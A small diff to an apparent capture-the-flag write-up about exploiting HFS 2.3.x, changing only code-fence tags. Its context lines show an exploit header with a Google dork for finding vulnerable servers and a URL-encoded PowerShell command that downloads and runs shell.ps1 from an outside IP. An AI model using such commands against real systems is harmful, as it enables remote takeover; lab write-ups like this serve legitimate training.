@@ -69,7 +69,7 @@ Shellcodes: No Results
 ```
 Using the `-x` option to exermine the first RCE.
 
-```py
+```sh
 # Exploit Title: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
 # Google Dork: intext:"httpfileserver 2.3"
 # Date: 20/02/2021
@@ -184,7 +184,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 On my browser, I will issue below command which is already `url` encoded `powershell` command
 
-```php
+```sh
 C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.Webclient).downloadString('http%3a//10.10.16.7%3a80/shell.ps1'
 ```
 ![Shell](/assets/img/optimum/shell.png)
